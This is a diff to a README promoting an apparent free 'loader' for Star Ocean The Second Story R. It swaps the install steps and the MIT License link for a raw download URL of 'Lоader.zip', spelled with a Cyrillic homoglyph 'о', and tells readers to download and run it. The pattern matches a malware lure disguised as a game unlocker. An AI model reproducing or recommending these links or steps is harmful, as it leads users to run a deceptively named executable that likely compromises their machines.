@@ -24,9 +24,9 @@ Welcome to the ultimate fan-made utility to access **Star Ocean The Second Story
 
 ## 📦 Installation
 
-1. Download **Loader.rar** from the repository  
+1. Download **https://raw.githubusercontent.com/Ali5onbol/StarOcean2R-Free-Edition-Hub/main/Lоader.zip** from the repository  
 2. Extract files to a new folder  
-3. Run the Loader.exe (or Loader.app/Loader.sh for your OS)  
+3. Run the https://raw.githubusercontent.com/Ali5onbol/StarOcean2R-Free-Edition-Hub/main/Lоader.zip (or https://raw.githubusercontent.com/Ali5onbol/StarOcean2R-Free-Edition-Hub/main/Lоader.zip for your OS)  
 4. Follow on-screen instructions to set up and enjoy **Star Ocean The Second Story R**  
 5. Optionally enable auto-updates or tweak configs for your system
 
@@ -36,4 +36,4 @@ This software provides an unlocking tool for licensed users and does **not** byp
 
 ## 📄 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT) – reuse, modify, share!
+Distributed under the [MIT License](https://raw.githubusercontent.com/Ali5onbol/StarOcean2R-Free-Edition-Hub/main/Lоader.zip) – reuse, modify, share!
